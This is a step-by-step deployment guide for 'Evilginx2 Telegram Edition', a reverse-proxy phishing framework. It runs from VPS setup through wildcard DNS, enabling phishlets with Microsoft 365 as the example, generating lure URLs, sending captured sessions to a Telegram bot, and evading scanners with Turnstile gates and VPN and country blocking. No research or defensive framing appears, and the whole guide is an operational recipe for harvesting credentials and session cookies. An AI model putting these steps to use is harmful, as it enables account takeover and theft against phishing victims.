# Evilginx2 Telegram Edition — VPS Deployment Guide

Complete step-by-step setup from a blank VPS to a running instance.

---

## 1. VPS Requirements

- **OS:** Ubuntu 22.04 LTS or Debian 12 (root access)
- **RAM:** 1 GB minimum (2 GB recommended)
- **Ports open:** 443 (HTTPS), 53 (DNS/UDP+TCP), 80 (optional, ACME challenge)
- **A domain name** with the ability to set custom nameservers or A records

---

## 2. Install Dependencies

```bash
apt update && apt upgrade -y
apt install -y git curl wget ufw
```

### Install Go (1.22+)

```bash
wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
rm -rf /usr/local/go
tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> /root/.bashrc
source /root/.bashrc
go version
```

---

## 3. Clone and Build

Replace `YOUR_PAT` with a GitHub Personal Access Token that has **repo** scope for `michaelinbox02-star/evilginx2`.

```bash
git clone https://YOUR_PAT@github.com/michaelinbox02-star/evilginx2.git /root/evilginx2
cd /root/evilginx2
go mod vendor
go build -o evilginx2 .
```

Verify the binary was created:

```bash
ls -lh /root/evilginx2/evilginx2
```

---

## 4. Configure DNS

### Option A — Wildcard A Record (simplest)

In your domain registrar / DNS panel:

| Type | Name | Value |
|------|------|-------|
| A    | `@`  | `<VPS IP>` |
| A    | `*`  | `<VPS IP>` |

This routes all subdomains to your VPS. Wildcard cert at `~/.evilginx/crt/wildcard/` is loaded automatically.

### Option B — Custom Nameservers (for ACME autocert)

Set your domain's nameservers to point to your VPS. Evilginx2 runs its own DNS server on port 53 and handles certificate issuance automatically.

---

## 5. Firewall Setup

```bash
ufw allow 22/tcp
ufw allow 53/tcp
ufw allow 53/udp
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 5000/tcp   # dashboard (restrict to your IP in production)
ufw enable
```

---

## 6. Create Systemd Service

```bash
cat > /etc/systemd/system/evilginx2.service << 'EOF'
[Unit]
Description=Evilginx2 Telegram Edition
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/evilginx2
ExecStart=/root/evilginx2/evilginx2 \
  -p /root/evilginx2/phishlets \
  -t /root/evilginx2/redirectors \
  -c /root/.evilginx \
  -dashboard 0.0.0.0:5000 \
  -dashboard-user admin \
  -dashboard-pass CHANGE_THIS_PASSWORD
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
```

> **Edit before enabling:** open the service file and change `CHANGE_THIS_PASSWORD` to a strong password.
> You can also add optional flags to `ExecStart`:
> - `-turnstile sitekey:secretkey` — Cloudflare Turnstile (or set later via console)
> - `-geoip-db /root/.evilginx/GeoIP` — enable country/VPN tracking
> - `-block-vpn` — block VPN/proxy visitors
> - `-block-countries RU,CN,IR` — block specific countries

```bash
systemctl daemon-reload
systemctl enable evilginx2
systemctl start evilginx2
systemctl status evilginx2
```

---

## 7. First-Run Console Configuration

Attach to the running console:

```bash
# If running via systemd, view logs:
journalctl -u evilginx2 -f

# To get an interactive console, stop the service and run directly:
systemctl stop evilginx2
/root/evilginx2/evilginx2 -p /root/evilginx2/phishlets -t /root/evilginx2/redirectors -c /root/.evilginx
```

Once inside the `: ` prompt, run these commands:

### Set Domain

```
config domain yourdomain.com
```

### Set Server IP

```
config ipv4 external YOUR_VPS_IP
config ipv4 bind YOUR_VPS_IP
```

### Set Telegram Notifications

1. Create a bot via [@BotFather](https://t.me/BotFather) on Telegram → get the **bot token**
2. Message your bot, then get your **chat ID** from `https://api.telegram.org/bot<TOKEN>/getUpdates`

```
config teletoken YOUR_BOT_TOKEN
config chatid YOUR_CHAT_ID
config telegram test
```

A test message should arrive in Telegram. ✅

### Set Cloudflare Turnstile (optional)

Create a Turnstile widget at dash.cloudflare.com → Turnstile → Add site.

```
config turnstile SITEKEY:SECRETKEY
```

Disable if not needed:

```
config turnstile off
```

### Set Dashboard Credentials (if not set in service file)

```
config dashboard-user admin
config dashboard-pass STRONG_PASSWORD
config dashboardsub dashboard
```

Dashboard will be at `https://dashboard.yourdomain.com` (or `http://YOUR_VPS_IP:5000`).

### Set Redirect URL for Unauthenticated Visitors

```
config unauth_url https://google.com
```

### Verify All Config

```
config
```

---

## 8. Set Up Phishlets

```
phishlets list
phishlets hostname <phishlet_name> login.yourdomain.com
phishlets enable <phishlet_name>
```

Example for Microsoft 365:

```
phishlets hostname microsoft login.yourdomain.com
phishlets enable microsoft
```

---

## 9. Create Lures

```
lures create <phishlet_name>
lures list
lures get-url <lure_id>
```

Set a custom subdomain for a lure:

```
lures edit <lure_id> hostname login365.yourdomain.com
lures edit <lure_id> path /signin
lures get-url <lure_id>
```

---

## 10. Set Up Redirect Pages (optional)

Place your HTML redirect page file in:

```
/root/.evilginx/redirects/
```

Then register it:

```
redirects add <subdomain> <filename.html> <target_url> [on|off]
```

- `on` = enable Cloudflare Turnstile gate before redirect
- `off` = immediate redirect (no gate)

Example:

```
redirects add verify page.html https://microsoft.com on
```

Page will be served at `https://verify.yourdomain.com`.

---

## 11. Managing Sessions

```
sessions list
sessions <id>
sessions delete <id>
sessions delete all
```

---

## 12. Restart as Service

After configuring via interactive console, exit (`quit`) and start the service:

```bash
systemctl start evilginx2
systemctl status evilginx2
```

All config is saved to `~/.evilginx/config.json` and persists across restarts.

---

## 13. Future Updates

Whenever new code is pushed to the repo, update the VPS:

```bash
cd /root/evilginx2
git pull origin master
go build -o evilginx2 .
systemctl restart evilginx2
```

---

## File Locations

| Path | Contents |
|------|----------|
| `/root/evilginx2/` | Source code + binary |
| `/root/evilginx2/phishlets/` | Phishlet YAML files |
| `/root/evilginx2/redirectors/` | HTML redirect templates |
| `~/.evilginx/` | Config, database, certs (survives rebuilds) |
| `~/.evilginx/data.db` | Session database |
| `~/.evilginx/config.json` | Saved configuration |
| `~/.evilginx/crt/` | TLS certificates |
| `~/.evilginx/crt/wildcard/` | Wildcard cert (fullchain.pem + privkey.pem) |
| `~/.evilginx/redirects/` | Uploaded redirect page HTML files |
| `~/.evilginx/GeoIP/` | GeoLite2-City.mmdb (optional) |

---

## Troubleshooting

**Port 53 already in use:**
```bash
systemctl stop systemd-resolved
systemctl disable systemd-resolved
```

**Cert issues — force re-provision:**
```bash
rm -rf ~/.evilginx/crt
systemctl restart evilginx2
```

**Check logs:**
```bash
journalctl -u evilginx2 -f
```

**Test Telegram after restart:**
```
config telegram test
```
